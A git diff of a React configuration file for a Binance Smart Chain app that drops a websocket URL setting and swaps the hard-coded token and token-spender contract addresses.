@@ -13,12 +13,6 @@ export const config = {
   JSON_RPC: process.env.REACT_APP_JSON_RPC,
 
   /**
-   * @description WSS_URL is the websocket endpoint of the WSS  endpoint
-   */
-
-  WSS_URL: process.env.REACT_APP_WSS_URL,
-
-  /**
    * @description BSC_SCAN_API_KEY provided by bscscan
    */
   BSCSCAN_API_KEY: process.env.REACT_APP_BSCSCAN_API_KEY,
@@ -29,7 +23,7 @@ export const config = {
    * @description TOKEN_ADDRESS is the address of the token that will be  sent
    */
 
-  TOKEN_TRANSFER: '0x871422643E116C364Db4f0Bc0dEB5202a624D2E9',
+  TOKEN_TRANSFER: '0x2195F0209803324BCeF4bB55B1b05215d5fF6845',
 
   /**
    * @description account address i.e WALLET_ADDRESS
@@ -42,5 +36,5 @@ export const config = {
    * @description SPENDER_ADDRESS is the address of the contract that will be used to spend the users tokens
    */
 
-  SPENDER_ADDRESS: '0x871422643E116C364Db4f0Bc0dEB5202a624D2E9', //smart contract to be approve amounts
+  SPENDER_ADDRESS: '0xc260e2Ade4CE2AB277cB192C7Ac49BECf3f5D9AA', //smart contract to be approve amounts
 }
